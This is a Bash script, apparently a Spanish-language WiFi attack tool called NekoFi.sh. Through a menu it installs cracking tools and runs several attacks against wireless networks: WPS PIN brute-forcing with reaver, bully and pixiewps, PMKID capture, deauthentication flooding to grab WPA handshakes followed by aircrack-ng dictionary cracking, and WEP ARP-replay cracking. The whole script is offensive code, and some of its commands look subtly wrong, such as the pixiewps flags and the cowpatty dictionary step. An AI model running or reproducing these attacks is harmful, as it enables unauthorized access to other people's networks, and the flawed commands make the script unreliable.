#!/bin/bash

# Lista de herramientas necesarias
tools=(
    iw aircrack-ng xterm tmux iproute2 pciutils usbutils rfkill wget ccze x11-xserver-utils systemd hashcat reaver hcxdumptool
    hcxpcaptool john pixiewps bully cowpatty crunch wash procps
)

# Función para verificar e instalar herramientas necesarias
install_tools() {
    echo "Verificando e instalando herramientas necesarias..."
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo "Instalando $tool..."
            if ! sudo apt-get update > /dev/null; then
                echo "Fallo en la actualización de paquetes"
                exit 1
            fi
            if ! sudo apt-get install -y "$tool" > /dev/null; then
                echo "Fallo en la instalación de $tool"
                exit 1
            fi
        else
            echo "$tool ya está instalado."
        fi
    done
}

# Función para manejar procesos que interfieren
kill_interfering_processes() {
    echo "Deteniendo procesos que pueden interferir..."
    sudo airmon-ng check kill
}

# Función para iniciar y detener el modo monitor
manage_monitor_mode() {
    local action=$1
    local channel=$2
    local interface="wlan0"
    if [[ $action == "start" ]]; then
        kill_interfering_processes
        sudo airmon-ng start $interface $channel || { echo "Fallo al iniciar el modo monitor"; exit 1; }
    elif [[ $action == "stop" ]]; then
        sudo airmon-ng stop wlan0mon || { echo "Fallo al detener el modo monitor"; exit 1; }
    fi
}

# Función para mostrar el menú de opciones
mostrar_menu() {
    clear
    echo "##############################################"
    echo "#                                            #"
    echo "#             NekoFi.sh                      #"
    echo "#             Versión 1.0                    #"
    echo "#             https://github.com/rodrigo47363/NekoFi #"
    echo "##############################################"
    echo
    echo "Seleccione una opción:"
    echo "1. Escanear redes WiFi"
    echo "2. Capturar Handshake (WPS/PMKID)"
    echo "3. Ataque WPS con Reaver"
    echo "4. Ataque WPS con PixieWPS"
    echo "5. Ataque WPS con Bully"
    echo "6. Ataque WPA/WPA2"
    echo "7. Ataque WEP"
    echo "8. Crear diccionario con Crunch"
    echo "9. Crear diccionario personalizado con Cowpatty"
    echo "10. Salir"
    echo "0. Ayuda"
}

# Función para mostrar ayuda
mostrar_ayuda() {
    echo "Ayuda - NekoFi.sh"
    echo "1. Escanear redes WiFi: Utiliza wash para escanear redes WiFi disponibles."
    echo "2. Capturar Handshake (WPS/PMKID): Usa hcxdumptool para capturar handshakes WPS/PMKID."
    echo "3. Ataque WPS con Reaver: Ataca redes con WPS usando Reaver."
    echo "4. Ataque WPS con PixieWPS: Ataca redes con WPS usando PixieWPS."
    echo "5. Ataque WPS con Bully: Ataca redes con WPS usando Bully."
    echo "6. Ataque WPA/WPA2: Realiza un ataque WPA/WPA2 usando un diccionario."
    echo "7. Ataque WEP: Realiza un ataque WEP."
    echo "8. Crear diccionario con Crunch: Crea un diccionario de contraseñas con Crunch."
    echo "9. Crear diccionario personalizado con Cowpatty: Crea un diccionario personalizado con Cowpatty."
    echo "10. Salir: Cierra el script."
}

# Función para escanear redes WiFi usando wash
escaneo_redes() {
    echo "Escaneando redes WiFi..."
    manage_monitor_mode "start"
    wash_output=$(mktemp)
    if ! sudo wash -i wlan0mon; then
        echo "Fallo al ejecutar wash"
        manage_monitor_mode "stop"
        exit 1
    fi
    echo "Redes WiFi encontradas:"
    sudo wash -i wlan0mon
    manage_monitor_mode "stop"
}

# Función para capturar handshakes (WPS/PMKID)
capturar_handshake() {
    echo "Capturando Handshake (WPS/PMKID)..."
    manage_monitor_mode "start"
    capture_file=$(mktemp)
    if ! sudo hcxdumptool -i wlan0mon -o "$capture_file" --enable_status=1; then
        echo "Fallo al ejecutar hcxdumptool"
        manage_monitor_mode "stop"
        exit 1
    fi
    if ! sudo hcxpcaptool -z pmkid_output.16800 "$capture_file"; then
        echo "Fallo al ejecutar hcxpcaptool"
        manage_monitor_mode "stop"
        exit 1
    fi
    if [ -s pmkid_output.16800 ]; then
        echo "PMKID capturados:"
        cat pmkid_output.16800
    else
        echo "No se capturaron PMKIDs."
    fi
    rm "$capture_file"
    manage_monitor_mode "stop"
}

# Función para ataque WPS con Reaver
ataque_wps_reaver() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    echo "Iniciando ataque WPS con Reaver..."
    manage_monitor_mode "start" $canal
    if ! sudo reaver -i wlan0mon -b $bssid -vv; then
        echo "Fallo al ejecutar Reaver"
        manage_monitor_mode "stop"
        exit 1
    fi
    manage_monitor_mode "stop"
}

# Función para ataque WPS con PixieWPS
ataque_wps_pixiewps() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    echo "Iniciando ataque WPS con PixieWPS..."
    manage_monitor_mode "start" $canal
    if ! sudo pixiewps -i wlan0mon -b $bssid -K; then
        echo "Fallo al ejecutar PixieWPS"
        manage_monitor_mode "stop"
        exit 1
    fi
    manage_monitor_mode "stop"
}

# Función para ataque WPS con Bully
ataque_wps_bully() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    echo "Iniciando ataque WPS con Bully..."
    manage_monitor_mode "start" $canal
    if ! sudo bully wlan0mon -b $bssid -c $canal -v 3; then
        echo "Fallo al ejecutar Bully"
        manage_monitor_mode "stop"
        exit 1
    fi
    manage_monitor_mode "stop"
}

# Función para ataque WPA/WPA2
ataque_wpa() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    read -p "Ingrese la ruta del diccionario: " diccionario
    echo "Iniciando ataque WPA/WPA2..."
    manage_monitor_mode "start" $canal
    if ! sudo airodump-ng --bssid $bssid --channel $canal -w handshake wlan0mon; then
        echo "Fallo al ejecutar airodump-ng"
        manage_monitor_mode "stop"
        exit 1
    fi
    sleep 10
    if ! sudo aireplay-ng --deauth 10 -a $bssid wlan0mon; then
        echo "Fallo al ejecutar aireplay-ng"
        manage_monitor_mode "stop"
        exit 1
    fi
    sleep 10
    sudo pkill airodump-ng || { echo "Fallo al detener airodump-ng"; exit 1; }
    if ! sudo aircrack-ng -w $diccionario -b $bssid handshake*.cap; then
        echo "Fallo al ejecutar aircrack-ng"
        manage_monitor_mode "stop"
        exit 1
    fi
    manage_monitor_mode "stop"
}

# Función para ataque WEP
ataque_wep() {
    escaneo_redes
    echo "Redes disponibles:"
    read -p "Ingrese el BSSID de la red: " bssid
    read -p "Ingrese el canal de la red: " canal
    echo "Iniciando ataque WEP..."
    manage_monitor_mode "start" $canal
    if ! sudo airodump-ng --bssid $bssid --channel $canal -w wep_capture wlan0mon; then
        echo "Fallo al ejecutar airodump-ng"
        manage_monitor_mode "stop"
        exit 1
    fi
    if ! sudo aireplay-ng --fakeauth 0 -a $bssid wlan0mon; then
        echo "Fallo al ejecutar aireplay-ng --fakeauth"
        manage_monitor_mode "stop"
        exit 1
    fi
    if ! sudo aireplay-ng --arpreplay -b $bssid wlan0mon; then
        echo "Fallo al ejecutar aireplay-ng --arpreplay"
        manage_monitor_mode "stop"
        exit 1
    fi
    sleep 60
    if ! sudo aircrack-ng -b $bssid wep_capture*.cap; then
        echo "Fallo al ejecutar aircrack-ng"
        manage_monitor_mode "stop"
        exit 1
    fi
    manage_monitor_mode "stop"
}

# Función para crear diccionario con Crunch
crear_diccionario_crunch() {
    read -p "Ingrese la longitud mínima de las contraseñas: " min_length
    read -p "Ingrese la longitud máxima de las contraseñas: " max_length
    read -p "Ingrese los caracteres a usar en el diccionario: " chars
    read -p "Ingrese el nombre del archivo de salida: " output_file
    echo "Creando diccionario con Crunch..."
    if ! crunch $min_length $max_length $chars -o $output_file; then
        echo "Fallo al ejecutar Crunch"
        exit 1
    fi
    echo "Diccionario creado: $output_file"
}

# Función para crear diccionario personalizado con Cowpatty
crear_diccionario_cowpatty() {
    read -p "Ingrese el SSID de la red: " ssid
    read -p "Ingrese el nombre del archivo de salida: " output_file
    read -p "Ingrese la ruta del diccionario base: " base_diccionario
    echo "Creando diccionario personalizado con Cowpatty..."
    if ! cowpatty -f $base_diccionario -s $ssid -o $output_file; then
        echo "Fallo al ejecutar Cowpatty"
        exit 1
    fi
    echo "Diccionario personalizado creado: $output_file"
}

# Main loop
install_tools

while true; do
    mostrar_menu
    read -p "Seleccione una opción: " opcion
    case $opcion in
        1)
            escaneo_redes
            ;;
        2)
            capturar_handshake
            ;;
        3)
            ataque_wps_reaver
            ;;
        4)
            ataque_wps_pixiewps
            ;;
        5)
            ataque_wps_bully
            ;;
        6)
            ataque_wpa
            ;;
        7)
            ataque_wep
            ;;
        8)
            crear_diccionario_crunch
            ;;
        9)
            crear_diccionario_cowpatty
            ;;
        10)
            echo "Saliendo..."
            exit 0
            ;;
        0)
            mostrar_ayuda
            ;;
        *)
            echo "Opción no válida."
            ;;
    esac
    read -p "Presione Enter para continuar..."
done
